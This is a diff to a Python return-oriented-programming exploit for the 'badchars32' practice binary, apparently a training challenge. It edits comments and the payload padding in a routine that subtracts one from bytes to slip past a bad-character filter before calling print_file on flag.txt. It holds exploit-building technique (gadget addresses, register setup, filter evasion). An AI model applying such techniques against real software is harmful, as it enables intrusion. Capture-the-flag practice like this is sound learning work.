@@ -5,6 +5,7 @@ import struct
 # run < <(python challenge.py)
 # need to write flag.txt into memory, and call print_file.
 
+# from gdb info functions or objdump!! not readelf
 # 0x080483d0  print_file@plt
 
 # ROPgadget --binary badchars32
@@ -120,9 +121,7 @@ def sanitize(data, start_addr):
 
 def patch_byte(addr):
     """
-        to get around filtering, will add one to each of the badchars if they appear in the string.
-        thus, if we see a character which is (badchar+1),
-        we know it needs to be transformed back by subtracting one.
+        Patch one byte by subtracting one from a byte at a given address.
 
         gadget to subtract one from a byte:
         0x0804854b : sub byte ptr [ebp], bl ; ret
@@ -139,8 +138,13 @@ def patch_byte(addr):
         set up registers for sub call;
         ret to sub call
     """
+
+    # sub gadget only cares about bl (lowest byte of ebx)
+    # so we can use any 3 bytes after \x01.
+    # esi/edi don't matter.
+    # address goes into ebp for sub gadget.
     payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
-            b'\x01AA\x01' + \
+            b'\x01AAA' + \
             deadcode + \
             deadcode + \
             addr + \
